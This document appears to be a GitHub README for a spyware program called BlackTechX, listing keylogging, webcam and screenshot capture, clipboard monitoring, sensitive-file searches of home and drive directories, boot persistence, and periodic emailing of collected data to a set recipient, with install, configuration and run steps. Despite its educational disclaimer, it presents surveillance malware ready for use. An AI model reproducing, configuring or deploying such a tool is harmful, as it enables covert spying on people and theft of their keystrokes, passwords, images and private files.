#🛡️ BLACKTECHX – ADVANCED SPY TOOL

⚠️⚠️⚠️ DISCLAIMER – READ BEFORE USING ⚠️⚠️⚠️

🚨 THIS TOOL IS STRICTLY FOR EDUCATIONAL AND SECURITY RESEARCH PURPOSES ONLY 🚨

⚡ AUTHORIZED USE ONLY:

Learning security concepts

Authorized penetration testing

Cybersecurity research

❌ PROHIBITED:

Unauthorized surveillance

Spying on others

Data theft or privacy invasion

⚠️ The author is NOT responsible for misuse. Use ethically.

📸 FEATURES
🔹 Core Surveillance

Keylogging – Capture real‑time keystrokes

Screenshots – Automatic capture at set intervals

Webcam Capture – Periodic snapshots

Clipboard Monitoring – Tracks copied text

🔹 Advanced Intelligence

System Info – Hardware & software details

Network Info – IP addresses, interfaces

File Discovery – Search for sensitive files

Process Monitoring – Lists running processes

🔹 Automated Reporting

Email Auto-Sender – Compressed data packages

Cross-Platform – Linux, Windows, macOS

Persistence – Auto-start on boot

UTM Optimized – Linux in UTM

🚀 QUICK START

1️⃣ Clone Repository

git clone https://github.com/yourusername/BlackTechX-Spy-Tool.git
cd BlackTechX-Spy-Tool


2️⃣ Install Dependencies

pip install -r requirements.txt


3️⃣ Configure Email

EMAIL_CONFIG = {
    'smtp_server': 'smtp.gmail.com',
    'smtp_port': 587,
    'sender_email': 'your_email@gmail.com',
    'sender_password': 'your_app_password',  # Gmail App Password
    'recipient_email': 'recipient_email@gmail.com',
    'email_interval': 300
}


4️⃣ Run the Tool

python spy_tool.py

🔐 GMAIL APP PASSWORD SETUP (REQUIRED)

1️⃣ Go to Google Account Settings

2️⃣ Open Security
3️⃣ Enable 2-Step Verification
4️⃣ Go to App passwords → generate password for Mail
5️⃣ Copy the 16-character password and use it in the script

⚠️ Security Tip: Never upload your real credentials to GitHub.

⚙️ CONFIGURATION OPTIONS
ADVANCED_CONFIG = {
    'screenshot_interval': 60,
    'webcam_interval': 300,
    'clipboard_monitor': True,
    'email_interval': 300
}

📁 File Search
file_extensions = ['.txt', '.doc', '.pdf', '.xls', '.csv', '.py', '.js']

# Linux / macOS
search_directories = ['/home', '/Users']

# Windows
search_directories = ['C:\\', 'D:\\']

🔧 SYSTEM REQUIREMENTS

Python 3.8+

Linux / Windows / macOS

Admin/root access recommended

Linux Dependencies
sudo apt-get install gnome-screenshot scrot imagemagick python3-opencv
